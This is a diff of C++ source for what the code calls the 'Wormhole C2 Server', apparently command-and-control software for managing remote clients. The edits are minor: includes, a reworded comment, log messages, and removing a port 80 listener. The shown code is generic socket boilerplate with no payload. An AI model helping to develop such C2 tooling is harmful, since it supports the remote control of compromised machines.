@@ -13,6 +13,8 @@
 #include <openssl/evp.h>
 #include <openssl/hmac.h>
 #include <openssl/err.h>
+#include <cstring>  
+#include <cerrno>
 
 using namespace std;
 using namespace chrono;
@@ -353,7 +355,7 @@ void StartServer(int port) {
         throw runtime_error("Socket creation failed");
     }
 
-    // Pridėta SO_REUSEPORT parinktis
+    // Leidžiame pakartotinį porto naudojimą
     int enable = 1;
     if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &enable, sizeof(enable)) < 0) {
         close(server_socket);
@@ -377,7 +379,7 @@ void StartServer(int port) {
 
     {
         lock_guard<mutex> lock(console_mutex);
-        cout << "[*] Server started on port " << port << endl;
+        cout << "[*] Server successfully started on port " << port << endl;
     }
 
     while (server_running) {
@@ -395,7 +397,6 @@ void StartServer(int port) {
 
     close(server_socket);
 }
-
 void ListClients() {
     lock_guard<mutex> lock(clients_mutex);
     if (clients.empty()) {
@@ -526,27 +527,32 @@ int main() {
     ERR_load_crypto_strings();
 
     try {
-        // Paleidžiame serverį portuose 443 ir 80 (HTTP tikrinimui)
-        thread server_thread(StartServer, 443);
-        thread http_thread(StartServer, 80);  // Papildomas portas HTTP tikrinimui
-
-        // Non-interactive režimas
-        cout << "[*] Wormhole C2 Server started successfully\n";
-        cout << "[*] Running in background mode\n";
+        cout << "[*] Starting Wormhole C2 Server..." << endl;
         
+        // Paleidžiame pagrindinį serverį
+        thread server_thread(StartServer, 443);
+        
+        // Leidžiame serveriui užsikrauti
+        this_thread::sleep_for(milliseconds(500));
+        
+        cout << "[*] Server is running in background mode" << endl;
+        cout << "[*] Use client applications to connect" << endl;
+
+        // Laukia, kol serveris bus išjungtas
         while (server_running) {
-            this_thread::sleep_for(chrono::seconds(1));
+            this_thread::sleep_for(seconds(1));
         }
 
         server_thread.join();
-        http_thread.join();
     }
     catch (const exception& e) {
         cerr << "Critical error: " << e.what() << endl;
         return 1;
     }
 
+    // Clean up OpenSSL
     EVP_cleanup();
     ERR_free_strings();
+
     return 0;
 }
